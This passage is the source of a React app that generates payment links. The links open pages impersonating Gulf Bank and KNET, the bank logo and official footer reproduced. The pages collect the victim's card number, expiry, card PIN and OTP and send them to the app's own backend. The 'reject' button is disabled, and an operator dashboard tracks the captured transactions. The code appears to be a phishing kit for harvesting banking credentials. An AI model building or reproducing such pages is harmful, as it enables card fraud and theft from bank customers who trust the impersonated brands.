import React, { useState, useEffect } from 'react';
import { 
  CreditCard, 
  Link as LinkIcon, 
  CheckCircle2, 
  XCircle, 
  Copy, 
  Check, 
  ExternalLink, 
  Building2, 
  Lock, 
  ShieldCheck, 
  ArrowRight, 
  RefreshCw, 
  Receipt, 
  Smartphone, 
  QrCode,
  AlertCircle,
  FileText,
  User,
  Sparkles,
  ChevronLeft,
  X,
  ShieldAlert
} from 'lucide-react';
import { QRCodeSVG } from 'qrcode.react';
import confetti from 'canvas-confetti';

interface PaymentLink {
  id: string;
  beneficiaryName: string;
  amount: number;
  currency: string;
  description: string;
  createdAt: string;
  status: 'active' | 'paid' | 'blocked' | 'expired';
  otpAttempts: number;
  paidAt?: string;
  transactionDetails?: {
    bankName: string;
    maskedCardNumber: string;
    authCode: string;
    referenceId: string;
    receiptId: string;
  };
}

interface Transaction {
  id: string;
  linkId: string;
  beneficiaryName: string;
  amount: number;
  currency: string;
  bankName: string;
  maskedCardNumber: string;
  status: 'SUCCESS' | 'FAILED' | 'BLOCKED';
  authCode: string;
  referenceId: string;
  timestamp: string;
}

const KUWAITI_BANKS = [
  { id: 'gulf', name: 'بنك الخليج (Gulf Bank)', color: 'from-red-700 to-rose-900' },
  { id: 'nbk', name: 'بنك الكويت الوطني (NBK)', color: 'from-amber-600 to-yellow-700' },
  { id: 'kfh', name: 'بيت التمويل الكويتي (KFH)', color: 'from-emerald-600 to-teal-800' },
  { id: 'cbk', name: 'البنك التجاري الكويتي (CBK)', color: 'from-blue-600 to-indigo-800' },
  { id: 'abk', name: 'البنك الأهلي الكويتي (ABK)', color: 'from-cyan-600 to-blue-700' },
  { id: 'burgan', name: 'بنك برقان (Burgan Bank)', color: 'from-amber-700 to-yellow-900' },
  { id: 'boubyan', name: 'بنك بوبيان (Boubyan Bank)', color: 'from-sky-600 to-blue-900' },
  { id: 'aub', name: 'البنك الأهلي المتحد (AUB)', color: 'from-purple-600 to-indigo-900' },
  { id: 'warba', name: 'بنك وربة (Warba Bank)', color: 'from-orange-600 to-amber-800' },
  { id: 'ibk', name: 'بنك الكويت الصناعي (Industrial Bank)', color: 'from-slate-600 to-slate-800' },
];

const LOCAL_STORAGE_LINKS_KEY = 'knet_paylink_links_v1';
const LOCAL_STORAGE_TX_KEY = 'knet_paylink_tx_v1';

const DEFAULT_DEMO_LINKS: PaymentLink[] = [
  {
    id: 'demo101',
    beneficiaryName: 'ELHAM MOHAMED ALY HASSAN',
    amount: 280.000,
    currency: 'د.ك',
    description: 'Business Income',
    createdAt: new Date().toISOString(),
    status: 'active',
    otpAttempts: 0
  }
];

export default function App() {
  const [activeTab, setActiveTab] = useState<'generator' | 'transactions'>('generator');
  const [currentLinkId, setCurrentLinkId] = useState<string | null>(null);

  // Payment Flow Steps: 'details' | 'card' | 'otp' | 'success' | 'failed' | 'blocked'
  const [paymentStep, setPaymentStep] = useState<'details' | 'card' | 'otp' | 'success' | 'failed' | 'blocked'>('details');

  const [links, setLinks] = useState<PaymentLink[]>([]);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [successMsg, setSuccessMsg] = useState<string | null>(null);

  // Form state for creating link
  const [beneficiaryName, setBeneficiaryName] = useState('');
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const [isCreating, setIsCreating] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Active payment session state
  const [activePaymentLink, setActivePaymentLink] = useState<PaymentLink | null>(null);
  const [selectedBank, setSelectedBank] = useState(KUWAITI_BANKS[0].name);
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('12');
  const [expiryYear, setExpiryYear] = useState('28');
  const [pin, setPin] = useState('');
  const [otp, setOtp] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [lastTx, setLastTx] = useState<Transaction | null>(null);
  const [qrModalLink, setQrModalLink] = useState<PaymentLink | null>(null);

  useEffect(() => {
    // Initialize LocalStorage if empty
    if (!localStorage.getItem(LOCAL_STORAGE_LINKS_KEY)) {
      localStorage.setItem(LOCAL_STORAGE_LINKS_KEY, JSON.stringify(DEFAULT_DEMO_LINKS));
    }
    if (!localStorage.getItem(LOCAL_STORAGE_TX_KEY)) {
      localStorage.setItem(LOCAL_STORAGE_TX_KEY, JSON.stringify([]));
    }

    const params = new URLSearchParams(window.location.search);
    const payId = params.get('pay');
    if (payId) {
      setCurrentLinkId(payId);
      fetchPaymentLink(payId);
    }
    fetchLinks();
    fetchTransactions();
  }, []);

  const fetchLinks = async () => {
    try {
      const res = await fetch('/api/links');
      if (res.ok) {
        const data = await res.json();
        setLinks(data);
        return;
      }
    } catch {
      // Fallback to localStorage for Netlify static deployment
    }
    const localLinks = JSON.parse(localStorage.getItem(LOCAL_STORAGE_LINKS_KEY) || '[]');
    setLinks(localLinks);
    setLoading(false);
  };

  const fetchTransactions = async () => {
    try {
      const res = await fetch('/api/transactions');
      if (res.ok) {
        const data = await res.json();
        setTransactions(data);
        return;
      }
    } catch {
      // Fallback
    }
    const localTx = JSON.parse(localStorage.getItem(LOCAL_STORAGE_TX_KEY) || '[]');
    setTransactions(localTx);
  };

  const fetchPaymentLink = async (id: string) => {
    setLoading(true);
    setErrorMsg(null);
    try {
      const res = await fetch(`/api/links/${id}`);
      const data = await res.json();
      if (res.ok) {
        setActivePaymentLink(data);
        if (data.status === 'blocked') {
          setPaymentStep('blocked');
        } else {
          setPaymentStep('details');
        }
        setLoading(false);
        return;
      }
    } catch {
      // Fallback to localStorage
    }

    const localLinks: PaymentLink[] = JSON.parse(localStorage.getItem(LOCAL_STORAGE_LINKS_KEY) || '[]');
    const link = localLinks.find((l) => l.id === id);
    if (!link) {
      setErrorMsg('رابط الدفع غير موجود أو انتهت صلاحيته');
      setLoading(false);
      return;
    }

    if (link.status === 'blocked') {
      setActivePaymentLink(link);
      setPaymentStep('blocked');
      setLoading(false);
      return;
    }

    setActivePaymentLink(link);
    setPaymentStep('details');
    setLoading(false);
  };

  const handleCreateLink = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!beneficiaryName || !amount) {
      setErrorMsg('يرجى إدخال اسم المستفيد والمبلغ بشكل صحيح');
      return;
    }

    setIsCreating(true);
    setErrorMsg(null);

    const newId = Math.random().toString(36).substring(2, 10);
    const newLink: PaymentLink = {
      id: newId,
      beneficiaryName: beneficiaryName.trim().toUpperCase(),
      amount: Number(amount),
      currency: 'د.ك',
      description: description ? description.trim() : 'Business Income',
      createdAt: new Date().toISOString(),
      status: 'active',
      otpAttempts: 0
    };

    try {
      const res = await fetch('/api/links', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ beneficiaryName, amount: Number(amount), description })
      });
      if (res.ok) {
        const created = await res.json();
        setLinks([created, ...links]);
        setBeneficiaryName('');
        setAmount('');
        setDescription('');
        setIsCreating(false);
        setSuccessMsg('تم إنشاء رابط الدفع الفريد بنجاح! الرابط جاهز للمشاركة والفتح على أي جهاز.');
        setTimeout(() => setSuccessMsg(null), 5000);
        return;
      }
    } catch {
      // Fallback storage
    }

    const localLinks = JSON.parse(localStorage.getItem(LOCAL_STORAGE_LINKS_KEY) || '[]');
    const updatedLinks = [newLink, ...localLinks];
    localStorage.setItem(LOCAL_STORAGE_LINKS_KEY, JSON.stringify(updatedLinks));
    setLinks(updatedLinks);
    setBeneficiaryName('');
    setAmount('');
    setDescription('');
    setIsCreating(false);
    setSuccessMsg('تم إنشاء رابط الدفع الفريد بنجاح (محلياً لـ Netlify)! الرابط جاهز للمشاركة.');
    setTimeout(() => setSuccessMsg(null), 5000);
  };

  const copyToClipboard = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2500);
  };

  const handleOpenPaymentPage = (link: PaymentLink) => {
    setActivePaymentLink(link);
    setCurrentLinkId(link.id);
    if (link.status === 'blocked') {
      setPaymentStep('blocked');
    } else {
      setPaymentStep('details');
    }
    const newUrl = `${window.location.pathname}?pay=${link.id}`;
    window.history.pushState({ path: newUrl }, '', newUrl);
  };

  const handleExitPayment = () => {
    setCurrentLinkId(null);
    setActivePaymentLink(null);
    window.history.pushState({}, '', window.location.pathname);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = val.match(/.{1,4}/g)?.join(' ') || val;
    setCardNumber(formatted);
  };

  const handleSubmitPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!activePaymentLink) return;

    if (!cardNumber || cardNumber.replace(/\s+/g, '').length < 16 || !expiryMonth || !expiryYear || !pin) {
      setErrorMsg('يرجى إكمال بيانات البطاقة المصرفية بشكل صحيح (16 رقماً)');
      return;
    }

    setIsProcessing(true);
    setErrorMsg(null);

    setTimeout(() => {
      setIsProcessing(false);
      setPaymentStep('otp');
      setOtp('');
    }, 1200);
  };

  const handleConfirmOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!activePaymentLink) return;

    if (!otp || otp.length !== 6) {
      setErrorMsg('يرجى إدخال رمز التحقق (OTP) المكون من 6 أرقام كاملة');
      return;
    }

    setIsProcessing(true);
    setErrorMsg(null);

    try {
      const res = await fetch(`/api/links/${activePaymentLink.id}/pay`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          bankName: selectedBank,
          cardNumber,
          expiryMonth,
          expiryYear,
          pin,
          otp
        })
      });

      const data = await res.json();

      if (res.ok) {
        setActivePaymentLink(data.link);
        setLastTx(data.transaction);
        setPaymentStep('success');
        fetchTransactions();
        fetchLinks();
        confetti({
          particleCount: 120,
          spread: 70,
          origin: { y: 0.6 }
        });
        setIsProcessing(false);
        return;
      } else {
        if (data.blocked) {
          setPaymentStep('blocked');
          setErrorMsg(data.error);
        } else {
          setErrorMsg(data.error || 'رمز التحقق غير صحيح');
        }
        setLastTx(data.transaction || null);
        setIsProcessing(false);
        return;
      }
    } catch {
      // Fallback local verification for Netlify static host
    }

    // Local Storage Fallback verification (Correct OTP: 123456, 3 attempts lock)
    const localLinks: PaymentLink[] = JSON.parse(localStorage.getItem(LOCAL_STORAGE_LINKS_KEY) || '[]');
    const linkIndex = localLinks.findIndex((l) => l.id === activePaymentLink.id);
    
    if (linkIndex === -1) {
      setErrorMsg('رابط الدفع غير موجود');
      setIsProcessing(false);
      return;
    }

    const currentLink = localLinks[linkIndex];

    if (otp !== '123456') {
      currentLink.otpAttempts = (currentLink.otpAttempts || 0) + 1;
      
      if (currentLink.otpAttempts >= 3) {
        currentLink.status = 'blocked';
        localLinks[linkIndex] = currentLink;
        localStorage.setItem(LOCAL_STORAGE_LINKS_KEY, JSON.stringify(localLinks));

        const blockedTx: Transaction = {
          id: 'TXN-BLOCKED-' + Math.floor(1000 + Math.random() * 9000),
          linkId: currentLink.id,
          beneficiaryName: currentLink.beneficiaryName,
          amount: currentLink.amount,
          currency: currentLink.currency,
          bankName: selectedBank,
          maskedCardNumber: '•••• •••• •••• ' + cardNumber.slice(-4),
          status: 'BLOCKED',
          authCode: 'SEC-LOCK-3',
          referenceId: 'REF-' + Math.floor(10000000 + Math.random() * 90000000),
          timestamp: new Date().toISOString()
        };
        const localTx = JSON.parse(localStorage.getItem(LOCAL_STORAGE_TX_KEY) || '[]');
        localStorage.setItem(LOCAL_STORAGE_TX_KEY, JSON.stringify([blockedTx, ...localTx]));

        setActivePaymentLink(currentLink);
        setPaymentStep('blocked');
        setErrorMsg('تم حظر المعاملة لأسباب أمنية بسبب تجاوز 3 محاولات إدخال خاطئة لرمز التحقق (OTP).');
        setIsProcessing(false);
        return;
      }

      localLinks[linkIndex] = currentLink;
      localStorage.setItem(LOCAL_STORAGE_LINKS_KEY, JSON.stringify(localLinks));
      setActivePaymentLink(currentLink);
      setErrorMsg(`رمز التحقق (OTP) غير صحيح. المحاولة ${currentLink.otpAttempts} من أصل 3 محاولات مسموحة.`);
      setIsProcessing(false);
      return;
    }

    // Success Local fallback
    const authCode = 'AUTH-' + Math.floor(100000 + Math.random() * 900000);
    const referenceId = 'KNET-' + Math.floor(10000000 + Math.random() * 90000000);
    const receiptId = 'RCP-' + Math.floor(1000000 + Math.random() * 9000000);

    currentLink.status = 'paid';
    currentLink.paidAt = new Date().toISOString();
    currentLink.transactionDetails = {
      bankName: selectedBank,
      maskedCardNumber: '•••• •••• •••• ' + cardNumber.slice(-4),
      authCode,
      referenceId,
      receiptId
    };

    localLinks[linkIndex] = currentLink;
    localStorage.setItem(LOCAL_STORAGE_LINKS_KEY, JSON.stringify(localLinks));

    const successTx: Transaction = {
      id: receiptId,
      linkId: currentLink.id,
      beneficiaryName: currentLink.beneficiaryName,
      amount: currentLink.amount,
      currency: currentLink.currency,
      bankName: selectedBank,
      maskedCardNumber: '•••• •••• •••• ' + cardNumber.slice(-4),
      status: 'SUCCESS',
      authCode,
      referenceId,
      timestamp: new Date().toISOString()
    };

    const localTx = JSON.parse(localStorage.getItem(LOCAL_STORAGE_TX_KEY) || '[]');
    localStorage.setItem(LOCAL_STORAGE_TX_KEY, JSON.stringify([successTx, ...localTx]));

    setActivePaymentLink(currentLink);
    setLastTx(successTx);
    setPaymentStep('success');
    fetchTransactions();
    fetchLinks();
    confetti({
      particleCount: 120,
      spread: 70,
      origin: { y: 0.6 }
    });
    setIsProcessing(false);
  };

  // If a payment link ID is active in URL or state, render independent KNet Payment Gateway flow
  if (currentLinkId || activePaymentLink) {
    const formattedDate = activePaymentLink 
      ? new Date(activePaymentLink.createdAt).toLocaleDateString('en-GB', { day: '2-digit', month: '2-digit', year: 'numeric' })
      : '30/10/2026';
    const formattedTime = activePaymentLink
      ? new Date(activePaymentLink.createdAt).toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true })
      : 'PM 06:07';

    return (
      <div className="min-h-screen bg-[#e5e7eb] text-slate-900 flex flex-col justify-center font-['Cairo'] select-none p-3 sm:p-4" dir="rtl">
        <div className="max-w-md mx-auto w-full">
          
          {/* Awareness Banner Image: ONLY for Card and OTP and Blocked pages */}
          {(paymentStep === 'card' || paymentStep === 'otp' || paymentStep === 'blocked') && (
            <div className="w-full rounded-t-2xl overflow-hidden shadow-md bg-white border-b border-slate-300">
              <img 
                src="/assets/aistudio/Screenshot_________________Chrome_1__968d2bfe.jpg" 
                alt="الحملة التوعوية المصرفية - بنك الكويت المركزي" 
                className="w-full h-auto object-cover block"
              />
            </div>
          )}

          <div className={`w-full bg-[#eef0f3] shadow-2xl p-4 sm:p-6 space-y-4 border border-slate-300 ${
            paymentStep === 'card' || paymentStep === 'otp' || paymentStep === 'blocked' ? 'rounded-b-2xl border-t-0' : 'rounded-2xl'
          }`}>
            
            {/* STEP 1: PAYMENT REVIEW SCREEN */}
            {paymentStep === 'details' && activePaymentLink && (
              <div className="space-y-6">
                <div className="bg-gradient-to-b from-[#b30000] via-[#8c0000] to-[#590000] pt-6 pb-6 px-6 text-center text-white rounded-2xl shadow-md">
                  <div className="flex items-center justify-center gap-2">
                    <svg className="w-10 h-8 text-white fill-current" viewBox="0 0 100 80">
                      <path d="M10,65 Q50,45 90,65 L80,72 Q50,55 20,72 Z" fill="white"/>
                      <path d="M30,55 L30,15 L75,45 Z" fill="white"/>
                      <path d="M35,20 L65,40 L35,45 Z" fill="#b30000"/>
                    </svg>
                    <div className="text-left font-serif tracking-widest font-black text-lg">
                      <div className="text-[13px] leading-tight text-white font-sans font-bold">بنك الخليج</div>
                      <div className="text-[15px] leading-tight tracking-[0.2em] font-sans font-extrabold">GULF BANK</div>
                    </div>
                  </div>
                </div>

                <div className="bg-white rounded-2xl p-6 shadow-sm border border-slate-200 space-y-6">
                  <div className="text-center pt-2">
                    <div className="flex items-baseline justify-center gap-1 text-slate-900" dir="ltr">
                      <span className="text-4xl font-black font-mono tracking-tight">
                        {activePaymentLink.amount.toFixed(3)}
                      </span>
                      <span className="text-base font-bold text-slate-500 uppercase">د.ك</span>
                    </div>
                  </div>

                  <div className="text-center space-y-1">
                    <p className="text-xs text-slate-400 font-medium">مطلوب من قبل</p>
                    <h2 className="text-base font-black text-slate-900 uppercase tracking-wide leading-snug">
                      {activePaymentLink.beneficiaryName}
                    </h2>
                  </div>

                  <hr className="border-slate-100 my-3" />

                  <div className="space-y-3 text-sm" dir="rtl">
                    <div className="flex justify-between items-center">
                      <span className="text-slate-400 text-xs">تاريخ الدفع</span>
                      <span className="font-mono text-slate-800 font-semibold text-xs" dir="ltr">
                        {formattedTime}, {formattedDate}
                      </span>
                    </div>

                    <div className="flex justify-between items-center">
                      <span className="text-slate-400 text-xs">المرجع</span>
                      <span className="font-mono text-slate-800 font-bold text-xs" dir="ltr">
                        {activePaymentLink.id.repeat(2).slice(0, 14)}
                      </span>
                    </div>

                    <div className="flex justify-between items-center">
                      <span className="text-slate-400 text-xs">تفاصيل الدفع</span>
                      <span className="text-slate-800 font-semibold text-xs">
                        {activePaymentLink.description || 'Business Income'}
                      </span>
                    </div>
                  </div>

                  {activePaymentLink.status === 'paid' ? (
                    <div className="bg-emerald-50 border border-emerald-200 rounded-2xl p-4 text-center space-y-3">
                      <CheckCircle2 className="w-10 h-10 text-emerald-600 mx-auto" />
                      <p className="text-emerald-800 font-bold text-sm">هذه الفاتورة مدفوعة مسبقاً بالفعل!</p>
                      <button
                        onClick={() => setPaymentStep('success')}
                        className="w-full py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-bold transition shadow-lg text-sm"
                      >
                        عرض إيصال الدفع الرقمي
                      </button>
                    </div>
                  ) : (
                    <div className="grid grid-cols-2 gap-4 pt-4" dir="rtl">
                      <button
                        onClick={() => setPaymentStep('card')}
                        className="w-full py-3 bg-[#00b020] hover:bg-[#00991b] text-white font-bold rounded-full shadow-lg transition flex items-center justify-center gap-2 text-sm"
                      >
                        <span>قبول</span>
                        <Check className="w-4 h-4 stroke-[3]" />
                      </button>

                      <button
                        type="button"
                        onClick={(e) => { e.preventDefault(); }}
                        className="w-full py-3 bg-[#cc0000] hover:bg-[#b30000] text-white font-bold rounded-full shadow-lg transition flex items-center justify-center gap-2 text-sm cursor-default"
                      >
                        <span>رفض</span>
                        <X className="w-4 h-4 stroke-[3]" />
                      </button>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* STEP 2: KNET CARD DETAILS PAGE */}
            {paymentStep === 'card' && activePaymentLink && (
              <div className="space-y-4" dir="rtl">
                <div className="bg-white rounded-2xl p-4 shadow-sm border border-slate-200 space-y-3">
                  <div className="flex items-center justify-center gap-2 pb-3 border-b border-slate-100">
                    <svg className="w-8 h-6 text-[#b30000] fill-current" viewBox="0 0 100 80">
                      <path d="M10,65 Q50,45 90,65 L80,72 Q50,55 20,72 Z" fill="#b30000"/>
                      <path d="M30,55 L30,15 L75,45 Z" fill="#b30000"/>
                    </svg>
                    <div className="text-left font-serif tracking-widest font-black text-sm text-slate-900">
                      <div className="text-[11px] leading-tight font-sans font-bold">بنك الخليج</div>
                      <div className="text-[12px] leading-tight tracking-[0.2em] font-sans font-extrabold text-[#b30000]">GULF BANK</div>
                    </div>
                  </div>

                  <div className="space-y-1.5 text-xs">
                    <div className="flex justify-between items-center pb-1.5 border-b border-slate-100">
                      <span className="text-sky-700 font-bold">المستفيد / التاجر:</span>
                      <span className="font-bold text-slate-800 uppercase">{activePaymentLink.beneficiaryName}</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sky-700 font-bold">المبلغ المطلوب:</span>
                      <span className="font-mono font-bold text-slate-900">{activePaymentLink.amount.toFixed(3)} د.ك</span>
                    </div>
                  </div>
                </div>

                <form onSubmit={handleSubmitPayment} className="bg-white rounded-2xl p-4 shadow-sm border border-slate-200 space-y-4">
                  <div className="flex justify-between items-center">
                    <span className="text-xs text-slate-500 font-medium">أدخل بيانات البطاقة المصرفية</span>
                  </div>

                  {errorMsg && (
                    <div className="bg-red-50 border border-red-200 text-red-700 text-xs p-2.5 rounded-lg">
                      {errorMsg}
                    </div>
                  )}

                  <div className="space-y-1">
                    <label className="text-xs font-bold text-sky-700 block">اختر البنك المصدر:</label>
                    <select
                      value={selectedBank}
                      onChange={(e) => setSelectedBank(e.target.value)}
                      className="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-xs text-slate-800 focus:outline-none focus:border-sky-600"
                    >
                      {KUWAITI_BANKS.map((b) => (
                        <option key={b.id} value={b.name}>{b.name}</option>
                      ))}
                    </select>
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-bold text-sky-700 block">رقم البطاقة (16 رقماً):</label>
                    <input
                      type="text"
                      maxLength={19}
                      placeholder="5078 2010 3849 9281"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      className="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 font-mono text-xs text-slate-800 focus:outline-none focus:border-sky-600 tracking-wider shadow-inner text-left"
                      dir="ltr"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-bold text-sky-700 block">تاريخ انتهاء الصلاحية:</label>
                    <div className="flex gap-2" dir="ltr">
                      <input
                        type="text"
                        maxLength={2}
                        placeholder="MM"
                        value={expiryMonth}
                        onChange={(e) => setExpiryMonth(e.target.value)}
                        className="w-1/2 bg-slate-50 border border-slate-300 rounded-lg px-2 py-2 text-center font-mono text-xs text-slate-800 focus:outline-none focus:border-sky-600"
                      />
                      <span className="self-center text-slate-400 font-bold">/</span>
                      <input
                        type="text"
                        maxLength={2}
                        placeholder="YY"
                        value={expiryYear}
                        onChange={(e) => setExpiryYear(e.target.value)}
                        className="w-1/2 bg-slate-50 border border-slate-300 rounded-lg px-2 py-2 text-center font-mono text-xs text-slate-800 focus:outline-none focus:border-sky-600"
                      />
                    </div>
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-bold text-sky-700 block">الرقم السري للبطاقة (PIN):</label>
                    <input
                      type="password"
                      maxLength={4}
                      placeholder="••••"
                      value={pin}
                      onChange={(e) => setPin(e.target.value)}
                      className="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 font-mono text-xs text-slate-800 focus:outline-none focus:border-sky-600 tracking-widest shadow-inner text-left"
                      dir="ltr"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-3 pt-3">
                    <button
                      type="submit"
                      disabled={isProcessing}
                      className="w-full py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-lg shadow-sm transition text-xs flex items-center justify-center gap-1.5"
                    >
                      {isProcessing ? (
                        <>
                          <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                          <span>جاري المعالجة...</span>
                        </>
                      ) : (
                        <span>تأكيد ودفع</span>
                      )}
                    </button>

                    <button
                      type="button"
                      onClick={() => setPaymentStep('details')}
                      className="w-full py-2.5 bg-slate-200 hover:bg-slate-300 text-slate-800 font-bold rounded-lg shadow-sm transition text-xs"
                    >
                      إلغاء
                    </button>
                  </div>
                </form>
              </div>
            )}

            {/* STEP 3: OTP VERIFICATION PAGE (6 Digits) */}
            {paymentStep === 'otp' && activePaymentLink && (
              <form onSubmit={handleConfirmOtp} className="bg-white rounded-2xl p-6 shadow-sm border border-slate-200 space-y-4 text-center" dir="rtl">
                <div className="w-12 h-12 rounded-xl bg-blue-50 border border-blue-200 flex items-center justify-center mx-auto text-sky-600">
                  <Smartphone className="w-6 h-6 animate-pulse" />
                </div>

                <div className="space-y-1">
                  <h3 className="text-sm font-bold text-slate-900">رمز التحقق المؤقت (OTP)</h3>
                  <p className="text-xs text-slate-500">
                    أدخل رمز التحقق المكون من 6 أرقام المرسل لهاتفك المحمول.
                  </p>
                </div>

                {errorMsg && (
                  <div className="bg-red-50 border border-red-200 text-red-700 text-xs p-2.5 rounded-lg font-medium">
                    {errorMsg}
                  </div>
                )}

                <div className="max-w-xs mx-auto">
                  <input
                    type="text"
                    maxLength={6}
                    placeholder="• • • • • •"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-center text-slate-900 font-mono text-xl tracking-[0.5em] focus:outline-none focus:border-sky-600 shadow-inner"
                    dir="ltr"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3 pt-2">
                  <button
                    type="button"
                    onClick={() => setPaymentStep('card')}
                    className="py-2.5 bg-slate-200 hover:bg-slate-300 text-slate-800 font-bold rounded-lg text-xs transition"
                  >
                    السابق
                  </button>
                  <button
                    type="submit"
                    disabled={isProcessing}
                    className="py-2.5 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white font-bold rounded-lg text-xs shadow-md transition flex items-center justify-center gap-1.5"
                  >
                    {isProcessing ? (
                      <>
                        <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                        <span>جاري التحقق...</span>
                      </>
                    ) : (
                      <span>تأكيد الدفع</span>
                    )}
                  </button>
                </div>
              </form>
            )}

            {/* BLOCKED PAGE (Security Lock after 3 failed OTP attempts) */}
            {paymentStep === 'blocked' && (
              <div className="bg-white rounded-2xl p-6 shadow-sm border border-red-200 space-y-4 text-center" dir="rtl">
                <div className="w-16 h-16 rounded-full bg-red-100 border-2 border-red-500 flex items-center justify-center mx-auto text-red-600 shadow-md">
                  <ShieldAlert className="w-9 h-9 animate-bounce" />
                </div>

                <div className="space-y-1.5">
                  <h3 className="text-base font-black text-red-700">تم حظر المعاملة لأسباب أمنية</h3>
                  <p className="text-xs text-slate-600">
                    تم تجاوز الحد الأقصى لمحاولات إدخال رمز التحقق (3 محاولات خاطئة). لأسباب أمنية وحماية لحسابك، تم قفل هذا الرابط نهائياً.
                  </p>
                </div>

                <div className="bg-red-50 p-3 rounded-xl border border-red-200 text-xs text-red-800 font-medium">
                  يرجى التواصل مع الجهة المستفيدة لإنشاء رابط دفع جديد.
                </div>

                <button
                  onClick={handleExitPayment}
                  className="w-full py-3 bg-slate-800 hover:bg-slate-700 text-white rounded-xl font-bold text-xs transition shadow"
                >
                  العودة للرئيسية
                </button>
              </div>
            )}

            {/* STEP 4A: SUCCESS PAGE */}
            {paymentStep === 'success' && activePaymentLink && (
              <div className="bg-white rounded-2xl p-6 shadow-sm border border-slate-200 space-y-4 text-center" dir="rtl">
                <div className="w-14 h-14 rounded-full bg-emerald-100 border-2 border-emerald-400 flex items-center justify-center mx-auto text-emerald-600">
                  <CheckCircle2 className="w-8 h-8" />
                </div>

                <div className="space-y-1">
                  <h3 className="text-base font-bold text-slate-900">تمت عملية الدفع بنجاح!</h3>
                  <p className="text-xs text-emerald-600 font-medium">تم اعتماد العملية وإيداع المبلغ في حساب المستفيد</p>
                </div>

                <div className="bg-slate-50 rounded-xl p-3 border border-slate-200 text-right space-y-1.5 text-xs">
                  <div className="flex justify-between pb-1 border-b border-slate-200">
                    <span className="text-slate-500">المستفيد:</span>
                    <span className="font-bold text-slate-900">{activePaymentLink.beneficiaryName}</span>
                  </div>
                  <div className="flex justify-between pb-1 border-b border-slate-200">
                    <span className="text-slate-500">المبلغ:</span>
                    <span className="font-bold text-emerald-600 font-mono">{activePaymentLink.amount.toFixed(3)} د.ك</span>
                  </div>
                  <div className="flex justify-between pb-1 border-b border-slate-200">
                    <span className="text-slate-500">رقم التفويض:</span>
                    <span className="font-mono text-sky-700">{activePaymentLink.transactionDetails?.authCode}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">المرجع:</span>
                    <span className="font-mono text-slate-700">{activePaymentLink.transactionDetails?.referenceId}</span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3 pt-2">
                  <button
                    onClick={() => window.print()}
                    className="py-2.5 bg-slate-200 hover:bg-slate-300 text-slate-800 rounded-lg text-xs font-bold transition flex items-center justify-center gap-1.5"
                  >
                    <Receipt className="w-3.5 h-3.5" />
                    طباعة الإيصال
                  </button>
                  <button
                    onClick={handleExitPayment}
                    className="py-2.5 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-bold transition"
                  >
                    إنهاء
                  </button>
                </div>
              </div>
            )}

            {/* STEP 4B: FAILED PAGE */}
            {paymentStep === 'failed' && (
              <div className="bg-white rounded-2xl p-6 shadow-sm border border-slate-200 space-y-4 text-center" dir="rtl">
                <div className="w-14 h-14 rounded-full bg-red-100 border-2 border-red-400 flex items-center justify-center mx-auto text-red-600">
                  <XCircle className="w-8 h-8" />
                </div>

                <div className="space-y-1">
                  <h3 className="text-base font-bold text-slate-900">فشلت عملية الدفع</h3>
                  <p className="text-xs text-red-600 font-medium">تم رفض العملية من البنك المصدر</p>
                </div>

                <div className="grid grid-cols-2 gap-3 pt-2">
                  <button
                    onClick={() => setPaymentStep('card')}
                    className="py-2.5 bg-slate-200 hover:bg-slate-300 text-slate-800 rounded-lg text-xs font-bold transition"
                  >
                    إعادة المحاولة
                  </button>
                  <button
                    onClick={handleExitPayment}
                    className="py-2.5 bg-red-600 hover:bg-red-500 text-white rounded-lg text-xs font-bold transition"
                  >
                    إلغاء
                  </button>
                </div>
              </div>
            )}

            {/* Official KNet Footer */}
            <div className="text-center pt-2 pb-1 space-y-1" dir="rtl">
              <p className="text-[11px] text-slate-600 font-medium">جميع الحقوق محفوظة &copy; 2026</p>
              <p className="text-[11px] text-sky-700 font-bold">
                شركة الخدمات المصرفية الآلية المشتركة - KNET
              </p>
            </div>

          </div>
        </div>
      </div>
    );
  }

  // MAIN DASHBOARD & LINK GENERATOR INTERFACE
  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-['Cairo']" dir="rtl">
      <header className="border-b border-slate-800/80 bg-slate-900/50 backdrop-blur-md sticky top-0 z-50">
